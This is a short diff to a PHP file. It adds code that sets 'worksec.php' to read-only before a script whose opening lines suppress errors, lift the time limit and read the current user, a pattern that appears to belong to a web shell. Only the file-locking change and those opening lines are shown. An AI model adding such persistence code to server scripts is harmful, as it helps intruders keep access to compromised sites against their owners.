@@ -1,5 +1,14 @@
 <?php
 
+// Path to the file
+$file = 'worksec.php';
+
+// Change the file permissions to 0444 (read-only)
+chmod($file, 0444);
+
+?>
+<?php
+
 error_reporting(0);
 set_time_limit(0);
 $user = get_current_user();
